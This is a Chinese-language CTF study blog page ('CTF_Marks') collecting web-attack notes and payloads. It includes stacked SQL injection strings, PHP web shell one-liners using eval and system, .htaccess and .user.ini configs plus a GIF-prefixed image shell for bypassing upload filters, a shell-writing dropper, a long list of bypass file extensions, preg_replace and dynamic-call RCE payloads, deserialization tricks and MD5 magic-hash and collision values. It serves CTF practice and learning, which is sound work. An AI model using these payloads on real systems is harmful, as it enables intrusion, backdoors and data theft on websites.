<!DOCTYPE html><html class="appearance-auto" lang="en"><head><meta charset="UTF-8"><title>CTF_Marks</title><meta name="description" content="Buona notte"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/favicon.ico"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="SQL【精选】攻防世界之supersqli_攻防世界supersqli_金 帛的博客-CSDN博客
showshow databases
show tables
当纯数字字符串是表名的时候需要加反引号:
show columns from `1919810931114514`
反引号表示内容为表明
handler【MySQL】MySQL 之 handler 的详细使用及说明_mysql handler-CSDN博客
1、打开句柄handler handler_table open;#这里可以使用别名

2、查看数据handler handler_table read first;
handler handler_table read next;

payload:
1&amp;#39;;use supersqli;.."><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Salve" type="application/atom+xml">
</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Taninluv's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">CTF_Marks</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL"><span class="toc-text">SQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#show"><span class="toc-text">show</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#handler"><span class="toc-text">handler</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81%E6%89%93%E5%BC%80%E5%8F%A5%E6%9F%84"><span class="toc-text">1、打开句柄</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E3%80%81%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE"><span class="toc-text">2、查看数据</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%84%E7%BC%96%E8%AF%91%E7%BB%95%E8%BF%87%E6%B3%95"><span class="toc-text">预编译绕过法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E5%8E%9F%E6%9F%A5%E8%AF%A2%E6%B3%95"><span class="toc-text">修改原查询法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4"><span class="toc-text">过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%90%E6%9F%A5%E8%AF%A2"><span class="toc-text">子查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F-load-file"><span class="toc-text">非预期-load_file</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FileUpload"><span class="toc-text">FileUpload</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-text">payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#htaccess"><span class="toc-text">.htaccess</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#user-ini%E6%96%87%E4%BB%B6"><span class="toc-text">.user.ini文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E7%BC%80"><span class="toc-text">后缀</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E7%BC%80%E5%90%8D"><span class="toc-text">后缀名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E5%86%99%E5%85%A5fputs"><span class="toc-text">访问写入fputs</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E7%9B%B8%E5%85%B3"><span class="toc-text">php相关</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE-%E5%8F%98%E9%87%8F%E5%8A%A8%E6%80%81%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-text">RCE-变量动态调用函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hex2bin-%E5%87%BD%E6%95%B0"><span class="toc-text">hex2bin() 函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base-convert-%E5%87%BD%E6%95%B0"><span class="toc-text">base_convert()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dechex-%E5%87%BD%E6%95%B0"><span class="toc-text">dechex()函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE-preg-replace"><span class="toc-text">RCE-preg_replace</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86"><span class="toc-text">路径遍历</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-POP-chains"><span class="toc-text">反序列化 POP chains</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87wakeup"><span class="toc-text">绕过wakeup</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9Epublic%E5%B1%9E%E6%80%A7"><span class="toc-text">非public属性</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MD5"><span class="toc-text">MD5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AE%B9%E8%AF%BB%E5%8F%96"><span class="toc-text">内容读取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%B1%E6%AF%94%E8%BE%83-x3D-x3D"><span class="toc-text">弱比较 &#x3D;&#x3D;</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#python%E7%9B%B8%E5%85%B3"><span class="toc-text">python相关</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI"><span class="toc-text">SSTI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#eval"><span class="toc-text">eval()</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%AD%A5%E9%AA%A4"><span class="toc-text">参考步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BE%E7%89%87"><span class="toc-text">图片</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E7%9F%A5%E6%96%87%E4%BB%B6"><span class="toc-text">未知文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-text">流量分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-1"><span class="toc-text">流量分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF"><span class="toc-text">一些思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pyc"><span class="toc-text">pyc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%BA%8C%EF%BC%9A"><span class="toc-text">方式二：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E7%BC%96%E8%AF%91"><span class="toc-text">反编译</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#formost-%E5%88%86%E7%A6%BB%E6%96%87%E4%BB%B6"><span class="toc-text">formost 分离文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#binwalk-%E6%A3%80%E7%B4%A2%E9%9A%90%E5%86%99"><span class="toc-text">binwalk 检索隐写</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%A4%B4"><span class="toc-text">常见文件头:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Core%E6%96%87%E4%BB%B6%E7%AE%80%E4%BB%8B"><span class="toc-text">Core文件简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E8%A7%A3%E5%90%88%E5%B9%B6%E5%9B%BE%E7%89%87"><span class="toc-text">分解合并图片</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#montage"><span class="toc-text">montage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gaps"><span class="toc-text">gaps</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Creating-puzzles-from-images"><span class="toc-text">Creating puzzles from images</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Solving-puzzles"><span class="toc-text">Solving puzzles</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Size-detection"><span class="toc-text">Size detection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="toc-text">压缩包</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%9A"><span class="toc-text">伪协议：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#iconv"><span class="toc-text">iconv:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE"><span class="toc-text">RCE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%A4%87%E4%BB%BD"><span class="toc-text">源码备份</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-text">SSRF</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-text">工具</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#cyberchef"><span class="toc-text">cyberchef:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Mysql"><span class="toc-text">Mysql</span></a></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/ctf"><i class="tag post-item-tag">ctf</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">CTF_Marks</h1><time class="has-text-grey" datetime="2023-11-01T12:16:11.000Z">2023-11-01</time><article class="mt-2 post-content"><h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/l2872253606/article/details/123362430">【精选】攻防世界之supersqli_攻防世界supersqli_金 帛的博客-CSDN博客</a></p>
<h2 id="show"><a href="#show" class="headerlink" title="show"></a>show</h2><p>show databases</p>
<p>show tables</p>
<p>当纯数字字符串是表名的时候需要加反引号:</p>
<p>show columns from `1919810931114514`</p>
<p>反引号表示内容为表明</p>
<h2 id="handler"><a href="#handler" class="headerlink" title="handler"></a>handler</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43427482/article/details/109898934">【MySQL】MySQL 之 handler 的详细使用及说明_mysql handler-CSDN博客</a></p>
<h5 id="1、打开句柄"><a href="#1、打开句柄" class="headerlink" title="1、打开句柄"></a>1、打开句柄</h5><pre><code class="mysql">handler handler_table open;#这里可以使用别名
</code></pre>
<h5 id="2、查看数据"><a href="#2、查看数据" class="headerlink" title="2、查看数据"></a>2、查看数据</h5><pre><code class="mysql">handler handler_table read first;
handler handler_table read next;
</code></pre>
<p>payload:</p>
<pre><code>1&#39;;use supersqli;handler `1919810931114514` open as p;handler p read first;
</code></pre>
<h2 id="预编译绕过法"><a href="#预编译绕过法" class="headerlink" title="预编译绕过法"></a>预编译绕过法</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/bb15070047748/article/details/107266400">什么是MySQL的预编译？_mysql 预编译-CSDN博客</a></p>
<pre><code>-1&#39;;

set @sql = CONCAT(&#39;sele&#39;,&#39;ct flag from `1919810931114514`;&#39;);
#@表示变量
prepare stmt from @sql;

EXECUTE stmt;#
</code></pre>
<p>感觉像是set设置变量值然后在语句中替换，使用concat绕过关键字过滤</p>
<h2 id="修改原查询法"><a href="#修改原查询法" class="headerlink" title="修改原查询法"></a>修改原查询法</h2><p>如果没有过滤alter，把默认展示的字段名字修改，把想看的字段名字、表明等修改为默认展示的名字</p>
<p>将放着flag的表1919810931114514名字改成words</p>
<p>alter table <code>1919810931114514</code> rename to words</p>
<p>表里头字段名flag改成id</p>
<p>alter table words change flag id varchar(100)</p>
<ul>
<li><p><code>ALTER TABLE words</code> 表示您要修改的表是名为 <code>words</code> 的表。</p>
</li>
<li><pre><code>CHANGE flag id varchar(100)
</code></pre>
<p> 是实际的修改部分。它的含义是：</p>
<ul>
<li><code>CHANGE</code> 表示您要更改一个列的属性。</li>
<li><code>flag</code> 是要更改的列的当前名称。</li>
<li><code>id</code> 是要将该列更改为的新名称。</li>
<li><code>varchar(100)</code> 是新的数据类型，将该列更改为 VARCHAR 类型，最大长度为 100 个字符。</li>
</ul>
</li>
</ul>
<h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><ul>
<li>strstr函数不区分大小写，所以我们可以改一下大小写来绕过strstr函数</li>
<li>过滤了union select，我们用union all select 就可以绕过</li>
</ul>
<h2 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_63525319/article/details/127982141">sql中的无关子查询与相关子查询和集合查询详细举例说明_无关子查询和相关子查询_ctf^_^的博客-CSDN博客</a></p>
<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311030020659.png" alt="image-20231103001841549"></p>
<p>相当于临时新建了一个a表，username字段放入admin，password字段放入123，用来绕过其后的验证：</p>
<pre><code>query (&quot;select username,password from &quot;.$this-&gt;table.&quot; where username=&#39;&quot;.$this-&gt;username.&quot;&#39; and password=&#39;&quot;.$this-&gt;password.&quot;&#39;&quot;);
</code></pre>
<p>这里实际相当于注入了一个表</p>
<h2 id="非预期-load-file"><a href="#非预期-load-file" class="headerlink" title="非预期-load_file"></a>非预期-load_file</h2><pre><code>?no=-1 union/**/select 1,load_file(&quot;/var/www/html/flag.php&quot;),3,4--+
</code></pre>
<p>如果猜到路径，直接load_file读取</p>
<h1 id="FileUpload"><a href="#FileUpload" class="headerlink" title="FileUpload"></a>FileUpload</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yuanxu8877/article/details/128071631">【精选】攻防世界easyupload （web新手）_sean7777777的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/l2sec/p/12633109.html">XCTF bug - l2sec - 博客园 (cnblogs.com)</a></p>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><pre><code>&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;
&lt;?= eval($_POST[1]);?&gt;
&lt;script language=&quot;php&quot;&gt;eval($_POST[1]);&lt;/script&gt;
&lt;script language=&quot;php&quot;&gt; highlight_file(__FILE__);system($_GET[&#39;cmd&#39;]);&lt;script&gt;
</code></pre>
<h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><pre><code>&lt;FilesMatch &quot;shell&quot; &gt;
SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;
</code></pre>
<p>将当前目录下文件名为shell的文件当成php来解析</p>
<pre><code>AddType application/x-httpd-php .mochu
</code></pre>
<p>将别的后缀名文件内容解析为php程序</p>
<h2 id="user-ini文件"><a href="#user-ini文件" class="headerlink" title=".user.ini文件"></a>.user.<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=ini%E6%96%87%E4%BB%B6&spm=1001.2101.3001.7020">ini文件</a></h2><p>具体参考<a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">.user.ini文件构成的PHP后门 - phith0n (wooyun.js.org)</a></p>
<p>在 <code>.user.ini</code> 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p>
<p>而且，和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p>
<p>在哪些情况下可以用到这个姿势？ 比如，某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。 再比如，你只是想隐藏个后门，这个方式是最方便的。</p>
<p>.user.ini</p>
<pre><code>auto_prepend_file=shell.jpg
</code></pre>
<p>shell.jpg</p>
<pre><code>GIF89a
&lt;?php eval($_P0ST[&#39;a&#39;]); ?&gt;
</code></pre>
<h2 id="后缀"><a href="#后缀" class="headerlink" title="后缀"></a>后缀</h2><p>利用了一个Linux的目录结构特性 , 请看下面代码：</p>
<p><img src="https://raw.githubusercontent.com/handbye/images/master/20190907181102.png" alt="20190907181102.png"></p>
<p>这里访问 <code>./1.php/2.php/..</code> 代表访问 <code>2.php</code>的父目录 , 也就是访问 <code>1.php</code> 。</p>
<p>因此这里构造数据包时 , 可以构造如下POST数据</p>
<pre><code>con=&lt;?php @eval($_POST[cmd]);?&gt;&amp;file=test.php/1.php/..
</code></pre>
<h3 id="后缀名"><a href="#后缀名" class="headerlink" title="后缀名"></a>后缀名</h3><pre><code>php
php2
php3
php4
php5
pHp
pHp2
pHp3
pHp4
pHp5
html
htm
phtml
pht
Html
Htm
pHtml
asp
aspx
asa
asax
ashx
asmx
cer
aSp
aSpx
aSa
aSax
aScx
aShx
aSmx
cEr
jsp
jspa
jspx
jsw
jxv
jspf
jtml
JSp
jSpx
jSpa
jSw
jSv
jSpf
jHtml
asp/test.jpg
asp;.jpg
cer/test.jpg
cer;.jpg
asa/test.jpg
asa;.jpg
aSp/test.jpg
aSp;.jpg
cEr/test.jpg
cEr;.jpg
aSa/test.jpg
aSa;.jpg
jpg/xx.php
jpg/xx.pHp
jpg/.php
jpg/.pHp
php.xs.aa
php2.aa
php3.aa
php4.aa
php5.aa
pHp.aa
pHp2.aa
pHp3.aa
pHp4.aaa
pHp5.aa
html.aa
htm.aa
phtml.aa
pht.aaa
Html.aaa
Htm.aa
pHtml.aa
php::$DATA
</code></pre>
<h2 id="访问写入fputs"><a href="#访问写入fputs" class="headerlink" title="访问写入fputs"></a>访问写入fputs</h2><p>from：攻防世界-web-wzsc :文件上传、条件竞争</p>
<pre><code>&lt;?php fputs(fopen(&quot;shell.php&quot;, &quot;w&quot;), &#39;&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;&#39;); ?&gt;
</code></pre>
<h1 id="php相关"><a href="#php相关" class="headerlink" title="php相关"></a>php相关</h1><h2 id="RCE-变量动态调用函数"><a href="#RCE-变量动态调用函数" class="headerlink" title="RCE-变量动态调用函数"></a>RCE-变量动态调用函数</h2><p>[buuctf-<a target="_blank" rel="noopener" href="https://blog.csdn.net/xhy18634297976/article/details/123148026">CISCN 2019 初赛]Love Math（小宇特详解）_小宇特详解的博客-CSDN博客</a></p>
<p>php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘cat&#x2F;flag’);</p>
<pre><code>$a=&#39;system&#39;;
$a(&#39;cat/flag&#39;);

payload:
?c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag
</code></pre>
<h3 id="hex2bin-函数"><a href="#hex2bin-函数" class="headerlink" title="hex2bin() 函数"></a>hex2bin() 函数</h3><p>hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。</p>
<p><a target="_blank" rel="noopener" href="https://coding.tools/cn/ascii-to-hex">ASCII字符串到16进制在线转换工具 - Coding.Tools</a></p>
<h3 id="base-convert-函数"><a href="#base-convert-函数" class="headerlink" title="base_convert()函数"></a>base_convert()函数</h3><p>base_convert()函数能够在任意进制之间转换数字</p>
<p>hex2bin可以看做是36进制，用base_convert来转换将在10进制的数字转换为16进制就可以出现hex2bin</p>
<p>hex2bin&#x3D;base_convert(37907361743,10,36)</p>
<h3 id="dechex-函数"><a href="#dechex-函数" class="headerlink" title="dechex()函数"></a>dechex()函数</h3><p>dechex()函数将10进制数转换为16进制的数</p>
<p><a target="_blank" rel="noopener" href="https://www.sojson.com/hexconvert/16to10.html">十六进制转十进制| 16进制转10进制 | 在线进制转换工具 (sojson.com)</a></p>
<h2 id="RCE-preg-replace"><a href="#RCE-preg-replace" class="headerlink" title="RCE-preg_replace"></a>RCE-preg_replace</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/giaogiao123/article/details/121217533">php代码审计之preg_replace函数_php preg_replace-CSDN博客</a></p>
<p>1.&#x2F;e修饰符必不可少<br>2.你必须让 subject 中有 pattern 的匹配。<br>3.可能跟php版本有关系,受用条件也只限于5.5到5.6的php版本<br>4.满足可变变量的条件</p>
<p>payload：</p>
<p>\S*&#x3D;${cmd}</p>
<p>直接传参\S*&#x3D;${@eval($_POST[‘cmd’])} 就可以蚁剑连接了</p>
<h2 id="路径遍历"><a href="#路径遍历" class="headerlink" title="路径遍历"></a>路径遍历</h2><p>?&#x2F;..&#x2F;flag &#x3D; &#x2F;..&#x2F;flag 这里的问号不会影响</p>
<h2 id="反序列化-POP-chains"><a href="#反序列化-POP-chains" class="headerlink" title="反序列化 POP chains"></a>反序列化 POP chains</h2><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231110111419036.png" alt="image-20231110111419036"></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cosmoslin/article/details/120297881">【精选】php反序列化—POP 链的构造利用_反序列化pop链-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.popen.php">PHP: popen - Manual</a></p>
<pre><code>popen(string $command, string $mode): resource|false
</code></pre>
<p>返回一个和 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.fopen.php">fopen()</a> 所返回的相同的文件指针，只不过它是单向的（只能用于读或写）并且必须用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.pclose.php">pclose()</a> 来关闭。此指针可以用于 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.fgets.php">fgets()</a>，<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.fgetss.php">fgetss()</a> 和 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.fwrite.php">fwrite()</a>。 当模式为 ‘r’，返回的文件指针等于命令的 STDOUT，当模式为 ‘w’，返回的文件指针等于命令的 STDIN。</p>
<pre><code>&lt;?php
$handle = popen(&quot;/bin/ls&quot;, &quot;r&quot;);
?&gt;
</code></pre>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gaohj/p/3267692.html">PHP执行系统外部命令函数:exec()、passthru()、system()、shell_exec() - gaohj - 博客园 (cnblogs.com)</a></p>
<pre><code>function passthru(string $command,int[optional] $return_value)
</code></pre>
<p>passthru直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，不返回任何值，且其可以输出二进制，比如图像数据。</p>
<pre><code>&lt;?php
        passthru(&quot;ls&quot;);
?&gt;
</code></pre>
<h2 id="绕过wakeup"><a href="#绕过wakeup" class="headerlink" title="绕过wakeup"></a>绕过wakeup</h2><p><a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2023/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADwakeup%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/">PHP反序列化中wakeup()绕过总结 – fushulingのblog</a></p>
<blockquote>
<p>可以利用cve-2016-7124进行绕过，将payload里ctf后面那个1改为2就行了，因为真实的属性其实只有一个，那就是那个flag，改为2之后对象属性个数的值就大于真实的属性个数了，因此可以绕过wakeup()，</p>
</blockquote>
<h3 id="非public属性"><a href="#非public属性" class="headerlink" title="非public属性"></a>非public属性</h3><p>[BUUCTF <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45642610/article/details/112591542">极客大挑战 2019]PHP 1_buuojphp1-CSDN博客</a></p>
<p>区别只在于对变量名添加了标记：</p>
<pre><code>public无标记，变量名不变，长度不变: s:2:&quot;op&quot;;i:2;
protected在变量名前添加标记%00*%00，长度+3: s:5:&quot;%00*%00op&quot;;i:2;
private在变量名前添加标记%00(classname)%00，长度+2+类名长度: s:17:&quot;%00FileHandler_Z%00op&quot;;i:2;
</code></pre>
<p>O:6:”class1”:3:{s:1:”a”;s:1:”1”;s:4:”<em>b”;s:5:”ThisB”;s:9:”class1c”;s:5:”ThisC”;}</em><br><em>对象序列化后的结构为：</em><br><em>O:对象名的长度:”对象名”:对象属性个数:{s:属性名的长度:”属性名”;s:属性值的长度:”属性值”;}a是public类型的变量，s表示字符串，1表示变量名的长度，a是变量名。b是protected类型的变量，它的变量名长度为4，也就是b前添加了%00</em>%00。所以，protected属性的表示方式是在变量名前加上%00*%00。c是private类型的变量，c的变量名前添加了%00类名%00。所以，private属性的表示方式是在变量名前加上%00类名%00。虽然Test类中有test1方法，但是，序列化得到的字符串中，只保存了公有变量a，保护变量b和私有变量c，并没保存类中的方法。也可以看出，序列化不保存方法。</p>
<h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><p>这里提供一些md5以后是0e开头的值：</p>
<pre><code>QNKCDZO
0e830400451993494058024219903391

s878926199a
0e545993274517709034328855841020

s155964671a
0e342768416822451524974117254469

s214587387a
0e848240448830537924465865611904

s214587387a
0e848240448830537924465865611904

s878926199a
0e545993274517709034328855841020

s1091221200a
0e940624217856561557816327384675

s1885207154a
0e509367213418206700842008763514

s1502113478a
0e861580163291561247404381396064

s1885207154a
0e509367213418206700842008763514

s1836677006a
0e481036490867661113260034900752

s155964671a
0e342768416822451524974117254469

s1184209335a
0e072485820392773389523109082030

s1665632922a
0e731198061491163073197128363787

s1502113478a
0e861580163291561247404381396064

s1836677006a
0e481036490867661113260034900752

s1091221200a
0e940624217856561557816327384675

s155964671a
0e342768416822451524974117254469

s1502113478a
0e861580163291561247404381396064

s155964671a
0e342768416822451524974117254469

s1665632922a
0e731198061491163073197128363787

s155964671a
0e342768416822451524974117254469

s1091221200a
0e940624217856561557816327384675

s1836677006a
0e481036490867661113260034900752

s1885207154a
0e509367213418206700842008763514

s532378020a
0e220463095855511507588041205815

s878926199a
0e545993274517709034328855841020

s1091221200a
0e940624217856561557816327384675

s214587387a
0e848240448830537924465865611904

s1502113478a
0e861580163291561247404381396064

s1091221200a
0e940624217856561557816327384675

s1665632922a
0e731198061491163073197128363787

s1885207154a
0e509367213418206700842008763514

s1836677006a
0e481036490867661113260034900752

s1665632922a
0e731198061491163073197128363787

s878926199a
0e545993274517709034328855841020
</code></pre>
<p>强碰撞：</p>
<pre><code>%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
</code></pre>
<pre><code>%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
</code></pre>
<h2 id="内容读取"><a href="#内容读取" class="headerlink" title="内容读取"></a>内容读取</h2><p>file_get_content()可以读取php:&#x2F;&#x2F;filter伪协议。</p>
<p><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=file_get_contents&spm=1001.2101.3001.7020">file_get_contents</a>、highlight_file() ，show_source()</p>
<p>readfile(&#x2F;tmp&#x2F;flagoefiu4r93)</p>
<p>scandir可以扫描目录（需要打印）</p>
